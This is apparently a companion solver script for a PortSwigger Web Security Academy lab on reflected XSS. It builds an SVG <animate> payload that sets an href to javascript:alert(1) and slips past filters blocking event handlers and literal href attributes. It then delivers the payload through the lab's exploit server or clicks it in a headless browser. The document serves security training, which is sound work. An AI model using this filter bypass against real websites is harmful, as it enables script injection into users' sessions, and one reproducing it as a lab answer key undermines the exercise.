#!/usr/bin/env python3
"""
Reflected XSS with event handlers and href attributes blocked
PortSwigger Web Security Academy -- Cross-Site Scripting (XSS)

Companion script for the writeup: 27-reflected-xss-event-handlers-href-blocked.md

What this does:
    The filter strips every on* event attribute and blocks any href value
    using the javascript: scheme, but SVG's <animate> element sets a target
    attribute dynamically through its own attributeName attribute rather than
    a literal href= on the tag -- a filter pattern-matching on the literal
    string "href=" never sees it coming. The payload wraps an <a> in <svg>,
    animates its href to javascript:alert(1), and labels the clickable area
    "Click me" so the platform's simulated victim can identify it as
    clickable text.

    This checks for an exploit server first (delivering the URL as a redirect,
    which is how the wrapper is written), and falls back to driving a headless
    browser directly to the crafted URL and clicking the rendered text if no
    exploit server is available -- which is what actually happened in our run.

Usage:
    python 27-reflected-xss-event-handlers-href-blocked.py <lab-url>
    e.g. python 27-reflected-xss-event-handlers-href-blocked.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx playwright
    playwright install chromium
"""

import re
import sys
import time
import urllib.parse
import httpx

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sync_playwright = None


def _get_exploit_server_url(client: httpx.Client, lab_url: str):
    r = client.get(f"{lab_url}/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else None


def _exploit_server_deliver(exploit_url: str, body: str,
                             path: str = "/exploit",
                             headers: str = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8") -> bool:
    with httpx.Client(follow_redirects=True, timeout=20, verify=False) as c:
        form_data = {
            "urlIsHttps": "on",
            "responseFile": path,
            "responseHead": headers,
            "responseBody": body,
            "formAction": "STORE",
        }
        r_store = c.post(exploit_url, data=form_data)
        if r_store.status_code >= 400:
            return False
        form_data["formAction"] = "DELIVER_TO_VICTIM"
        r_deliver = c.post(exploit_url, data=form_data)
        return r_deliver.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    warmup = client.get(lab_url)
    session = warmup.cookies.get("session", "")
    domain = lab_url.split("/")[2]

    search_payload = (
        '<svg><a><animate attributeName=href values=javascript:alert(1) />'
        '<text x=20 y=20>Click me</text></a></svg>'
    )
    xss_url = f"{lab_url}/?search={urllib.parse.quote(search_payload)}"
    print(f"[*] Payload: {search_payload}")
    print(f"[*] Target URL: {xss_url}")

    exploit_url = _get_exploit_server_url(client, lab_url)
    if exploit_url:
        print(f"[*] Exploit server found -- delivering redirect via {exploit_url}")
        iframe_body = f'<script>location="{xss_url}";</script>'
        _exploit_server_deliver(exploit_url, iframe_body)
        time.sleep(8)
    else:
        print("[*] No exploit server available -- driving headless browser directly")
        if sync_playwright is None:
            print("[!] playwright not installed -- cannot confirm alert() execution.")
            print(f"    Install it, or open this URL yourself and click 'Click me': {xss_url}")
            return

        alert_fired = False
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            ctx = browser.new_context()
            if session:
                ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
            page = ctx.new_page()

            def on_dialog(dialog):
                nonlocal alert_fired
                alert_fired = True
                dialog.accept()

            page.on("dialog", on_dialog)
            try:
                page.goto(xss_url, wait_until="domcontentloaded", timeout=15000)
                page.wait_for_timeout(1000)
                page.click("text=Click me", timeout=5000)
                page.wait_for_timeout(2000)
            except Exception:
                pass
            browser.close()
        print(f"[{'+' if alert_fired else '-'}] alert() fired: {alert_fired}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
